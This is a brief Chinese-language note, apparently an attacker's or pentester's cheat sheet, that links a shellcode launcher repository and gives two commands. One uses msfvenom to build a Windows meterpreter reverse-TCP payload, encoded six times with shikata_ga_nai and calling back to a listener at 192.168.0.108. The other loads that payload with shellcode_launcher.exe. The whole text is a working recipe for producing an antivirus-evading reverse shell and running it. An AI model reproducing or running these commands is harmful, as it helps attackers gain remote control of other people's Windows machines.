	https://github.com/clinicallyinane/shellcode_launcher/
	生成payload(raw)
	>msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.0.108 lport=12138 -f raw -o shellcode.raw
	加载器加载
	>shellcode_launcher.exe -i shellcode.raw